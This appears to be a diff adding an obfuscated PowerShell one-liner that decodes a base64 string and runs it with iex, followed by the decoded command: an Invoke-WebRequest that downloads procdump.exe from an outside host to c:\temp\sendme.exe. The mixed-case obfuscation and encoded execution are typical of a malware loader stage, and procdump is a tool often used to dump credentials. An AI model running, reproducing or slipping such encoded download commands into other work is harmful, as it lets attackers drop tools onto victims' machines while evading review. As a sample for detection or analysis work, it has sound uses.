@@ -1,0 +1,7 @@
+iex([SYSTeM.TExT.eNCODinG]::Utf8.GEtstRIng([systEM.coNVERt]::FROMbASe64STRIng('Ckludm9rZS1XZWJSZXF1ZXN0IC1VcmkgaHR0cDovL3N0ZGVyci5wbC9wcm9jZHVtcC5leGUgLU91dEZpbGUgYzpcdGVtcFxzZW5kbWUuZXhlCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe
+
